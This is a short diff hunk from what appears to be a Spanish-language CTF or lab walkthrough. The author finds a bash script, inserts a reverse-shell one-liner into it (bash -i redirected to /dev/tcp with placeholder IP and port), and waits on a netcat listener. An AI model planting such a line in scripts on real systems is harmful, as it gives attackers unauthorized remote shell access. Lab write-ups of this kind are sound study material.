@@ -182,7 +182,7 @@ Ahí está lo que buscaba
 
 Lo que hay es un simple script en bash, pruebo a meter una shell en bash.
 
-
+`bash -i >& /dev/tcp/<ip>/<port> 0>&1`
 
 Abrimos un oyente de netcat y tras esperar unos segundos...
 
